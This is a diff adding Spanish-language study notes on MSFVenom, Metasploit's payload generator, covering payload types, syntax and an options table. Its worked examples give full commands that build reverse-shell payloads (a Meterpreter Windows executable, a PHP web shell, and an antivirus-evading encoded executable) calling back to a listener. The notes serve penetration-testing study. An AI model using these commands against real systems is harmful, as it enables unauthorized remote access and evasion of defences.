@@ -1,0 +1,70 @@
+MSFVenom es una herramienta del framework Metasploit utilizada para generar payloads maliciosos (archivos o códigos que permiten obtener acceso a un sistema) y combinarlos con exploits.
+
+Se fusionó con la antigua herramienta msfpayload y msfencode en Metasploit.
+
+
+¿Para qué se usa?
+
+    > Generar payloads para pruebas de penetración.
+    > Crear exploits personalizados para sistemas Windows, Linux, macOS, Android, etc.
+    > Codificar payloads para evadir antivirus o detección de IDS/IPS.
+    > Integrar payloads en documentos, scripts, ejecutables o binarios.
+    
+    Nota: Su uso debe ser exclusivamente en entornos legales o de pruebas autorizadas
+
+
+Tipos de payloads
+
+    1. Singles → Payload que hace una acción específica, p. ej., abrir un reverse shell.
+    2. Stagers → Payloads que preparan la conexión para recibir payloads más grandes (“staged payloads”).
+    3. Stages → Payloads grandes que se envían tras el stager.
+    
+    Ejemplos:
+    
+        > windows/meterpreter/reverse_tcp → Shell inversa Meterpreter en Windows.
+        > linux/x86/shell_reverse_tcp → Shell inversa en Linux.
+
+
+Sintaxis básica
+
+    msfvenom -p <payload> LHOST=<ip_local> LPORT=<puerto> -f <formato> [opciones]
+
+
+Opciones principales de MSFVenom
+
+    -------------------------------------------------------------------------------------------------------------------------
+    |  Opción             |  Descripción                                            |  Ejemplo de Uso                       |
+    -------------------------------------------------------------------------------------------------------------------------
+    |  -p                 |  Especificar payload                                    |  -p windows/meterpreter/reverse_tcp   |
+    |  LHOST              |  IP local (donde recibes la conexión inversa)           |  LHOST=192.168.1.10                   |
+    |  LPORT              |  Puerto de escucha                                      |  LPORT=4444                           |
+    |  -f exe             |  Formato de salida: Ejecutable de Windows               |                                       |
+    |  -f elf             |  Formato de salida: Linux                               |                                       |
+    |  -f apk             |  Formato de salida: Android                             |                                       |
+    |  -f php, asp, jsp   |  Formato de salida: Scripts web                         |                                       |
+    |  -f raw, c, python  |  Formato de salida: Código fuente                       |                                       |
+    |  -o                 |  Guardar en un archivo                                  |  -o payload.exe                       |
+    |  -a                 |  Arquitectura (x86, x64, ARM, etc.)                     |  -a x64                               |
+    |  -b                 |  Badchars, caracteres a evitar (útil para exploits)     |  -b "\x00\x0a\x0d"                    |
+    |  -e                 |  Codificador (encode) para evadir antivirus             |  -e x86/shikata_ga_nai                |
+    |  --platform         |  Sistema objetivo (Windows, Linux, Android, PHP, etc.)  |                                       |
+    -------------------------------------------------------------------------------------------------------------------------
+
+
+Ejemplos prácticos
+
+    ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    |  Descripción                                        |  Ejemplo de Uso                                                                                                                           |  
+    ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    |  Generar un ejecutable de Windows con Meterpreter   |  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe                                            |
+    |  Generar un script PHP malicioso                    |  msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php                                                |
+    |  Evitar caracteres malos y codificar payload        |  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f exe -o shell_encoded.exe  |
+    ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Resumen
+
+    > MSFVenom = Generador de payloads de Metasploit.
+    > Se usa para pentesting, pruebas de exploits y pruebas de seguridad en entornos controlados.
+    > Pemite generar payloads en múltiples formatos y plataformas.
+    > Tiene opciones de codificación, exclusión de caracteres, arquitectura y plataforma.
